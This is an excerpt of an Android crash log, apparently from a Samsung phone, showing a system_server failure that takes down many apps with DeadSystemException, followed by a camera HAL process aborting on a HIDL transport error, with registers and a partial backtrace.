+01-12 23:30:11.390  1150  3650 E AndroidRuntime:        at android.os.Parcel.createStringArrayList(Parcel.java:2967)
+01-12 23:30:11.390  1150  3650 E AndroidRuntime:        at com.samsung.android.wifi.ISemWifiManager$Stub.onTransact(ISemWifiManager.java:2244)
+01-12 23:30:11.390  1150  3650 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:30:11.390  1150  3650 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 23:30:12.070  1432  1432 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 23:30:12.070  1432  1432 E AndroidRuntime: Process: com.android.phone, PID: 1432
+01-12 23:30:12.070  1432  1432 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.070  5304  5304 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 23:30:12.070  5304  5304 E AndroidRuntime: Process: com.samsung.android.mobileservice, PID: 5304
+01-12 23:30:12.070  5304  5304 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.074  5304  5709 E AndroidRuntime: FATAL EXCEPTION: SmpCtrThread
+01-12 23:30:12.074  5304  5709 E AndroidRuntime: Process: com.samsung.android.mobileservice, PID: 5304
+01-12 23:30:12.074  5304  5709 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.085  2719  2719 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 23:30:12.085  2719  2719 E AndroidRuntime: Process: com.google.android.googlequicksearchbox:interactor, PID: 2719
+01-12 23:30:12.085  2719  2719 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.149  4504  4504 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 23:30:12.149  4504  4504 E AndroidRuntime: Process: com.samsung.android.email.provider, PID: 4504
+01-12 23:30:12.149  4504  4504 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.157  2874  5283 E AndroidRuntime: FATAL EXCEPTION: GoogleApiHandler
+01-12 23:30:12.157  2874  5283 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 2874
+01-12 23:30:12.157  2874  5283 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.160  2874  5708 E AndroidRuntime: FATAL EXCEPTION: IntentService[DropBoxEntryAddedChimeraService]
+01-12 23:30:12.160  2874  5708 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 2874
+01-12 23:30:12.160  2874  5708 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.164  1858  2047 E AndroidRuntime: FATAL EXCEPTION: ImsServiceStub
+01-12 23:30:12.164  1858  2047 E AndroidRuntime: Process: com.sec.imsservice, PID: 1858
+01-12 23:30:12.164  1858  2047 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.170  3813  3813 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 23:30:12.170  3813  3813 E AndroidRuntime: Process: com.google.android.projection.gearhead:shared, PID: 3813
+01-12 23:30:12.170  3813  3813 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.196  2874  3514 E AndroidRuntime: FATAL EXCEPTION: [com.google.android.gms.chimera.container.intentoperation.PersistentIntentOperationChimeraService-Executor] idle
+01-12 23:30:12.196  2874  3514 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 2874
+01-12 23:30:12.196  2874  3514 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:30:12.528  1029  5702 F libc    : Fatal signal 6 (SIGABRT), code -1 (SI_QUEUE) in tid 5702 (m_resultCallbac), pid 1029 (provider@4.0-se)
+01-12 23:30:12.697  5836  5836 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
+01-12 23:30:12.698  5836  5836 F DEBUG   : Build fingerprint: 'samsung/a20eeea/a20e:11/RP1A.200720.012/A202FXXU3CVC1:user/release-keys'
+01-12 23:30:12.698  5836  5836 F DEBUG   : Revision: '3'
+01-12 23:30:12.698  5836  5836 F DEBUG   : ABI: 'arm'
+01-12 23:30:12.705  5836  5836 F DEBUG   : Timestamp: 2024-01-12 23:30:12+0200
+01-12 23:30:12.705  5836  5836 F DEBUG   : pid: 1029, tid: 5702, name: m_resultCallbac  >>> /vendor/bin/hw/vendor.samsung.hardware.camera.provider@4.0-service <<<
+01-12 23:30:12.705  5836  5836 F DEBUG   : uid: 1047
+01-12 23:30:12.705  5836  5836 F DEBUG   : signal 6 (SIGABRT), code -1 (SI_QUEUE), fault addr --------
+01-12 23:30:12.706  5836  5836 F DEBUG   : Abort message: 'Failed HIDL return status not checked. Usually this happens because of a transport error (error parceling, binder driver, or from unparceling). If you see this in code calling into "Bn" classes in for a HAL server process, then it is likely that the code there is returning transport errors there (as opposed to errors defined within its protocol). Error is: Status(EX_TRANSACTION_FAILED): 'DEAD_OBJECT: ''
+01-12 23:30:12.706  5836  5836 F DEBUG   :     r0  00000000  r1  00001646  r2  00000006  r3  f349fbb8
+01-12 23:30:12.706  5836  5836 F DEBUG   :     r4  f349fbcc  r5  f349fbb0  r6  00000405  r7  0000016b
+01-12 23:30:12.706  5836  5836 F DEBUG   :     r8  f349fbb8  r9  f349fbc8  r10 f349fbe8  r11 f349fbd8
+01-12 23:30:12.706  5836  5836 F DEBUG   :     ip  00001646  sp  f349fb88  lr  f538add5  pc  f538ade8
+01-12 23:30:12.800  5836  5836 F DEBUG   : backtrace:
+01-12 23:30:12.801  5836  5836 F DEBUG   :       #00 pc 00062de8  /apex/com.android.runtime/lib/bionic/libc.so (abort+172) (BuildId: fef5b751123147ea65bf3f4f798c9518)
+01-12 23:30:12.801  5836  5836 F DEBUG   :       #01 pc 00004ceb  /system/lib/liblog.so (__android_log_default_aborter+6) (BuildId: 3fcead474cd0ecbdafb529ff176b0d13)
+01-12 23:30:12.801  5836  5836 F DEBUG   :       #02 pc 0000d2b3  /apex/com.android.vndk.v30/lib/libbase.so (android::base::LogMessage::~LogMessage()+222) (BuildId: 96c3c68af17a377328bb6612d753dbc6)
+01-12 23:30:12.801  5836  5836 F DEBUG   :       #03 pc 00030f33  /apex/com.android.vndk.v30/lib/libhidlbase.so (android::hardware::details::return_status::assertOk() const+138) (BuildId: 3947303c571644640642a031e67850be)
+
